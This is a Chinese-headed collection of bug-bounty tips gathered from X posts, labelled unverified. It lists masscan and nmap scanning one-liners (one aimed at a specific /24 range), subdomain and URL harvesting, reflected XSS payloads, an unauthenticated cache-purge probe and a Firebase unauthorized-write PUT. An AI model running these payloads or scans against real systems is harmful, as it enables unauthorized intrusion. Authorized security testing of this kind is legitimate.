# X 语料 · 残余回收（其他技术片段）

来源：X 公开贴子，含可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体）。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：本类无专属篇，按 [检测入口](../vuln-detection.md) 选择 · 索引与计数：[x-corpus.md](x-corpus.md) · 本文 46 行

- wget https://raw.githubusercontent.com/KingOfBugbounty/KingOfBugBountyTips/master/downlink ; xargs -a downlink -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/
  Download all sites bounty Chaos
- masscan -iL ip.txt can help to scan over list of IP
  Then you can look out those open ports manually one by one
  If you see webapps try with default creds / noredirect addon
- Payload for Drupal sites: %3cscript%3ealert%28document.domain%29%3c%2fscript%3e
- Get only open ports from a list of thousands of NMAP results:
  nmap -vv -iL file | awk -F'[ /]' '/Discovered open port/{print $NF":"$4}' > results.txt
- Reflected xss
  Payload : %27%2B%3C%2FScripT%3E%3CScRIpT%3Eprompt%28document.domain%29%3C%2FscRIpT%3E%2B%27
- Clearbit:
  curl 'https://person.clearbit.com/v2/combined/find?email=EmailToTest' \
   -u sk_Secret:
  Validate the key by looking up a known email:
  See all functions on: https://dashboard.clearbit.com/docs
- TCP Port Discovery
  #Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
  masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
- HTTP Port Discovery
  HTTP service discovery in a /24 range:
  masscan -p80,443,8000-8100,8443 199.66.11.0/24
- Using "grep" to Extract URL's from junk data.
  cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
  curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
- Dump URLs from sitemap.xml:
  curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
- A quick one-liner to get most of the wildcard domains of BBPs:
  curl -s https://raw\.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r
- One-liner to get subdomains from wayback:
  curl -s 'http://web\.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey' | sed -e 's_https*://__' -e "s/\/.*//" | sed 's/www\.//g' | sed 's/:80//g' | sort -u
- Try this command:
  curl -X PURGE https://target[.]com
  If you receive a "status : ok" response with a random id, you might have found the issue!
  Bug: Unauthenticated Cache Purge
- Search for disclosed reports right from your terminal:
  curl http://term.rohsec.com/search/stored+xss
- A publicly exposed Firebase configuration allowed unauthorized data uploads.
  Command:
  curl "https://your-firebase-domain.com/poc.json" -XPUT -d '{"POC":"POC"}'
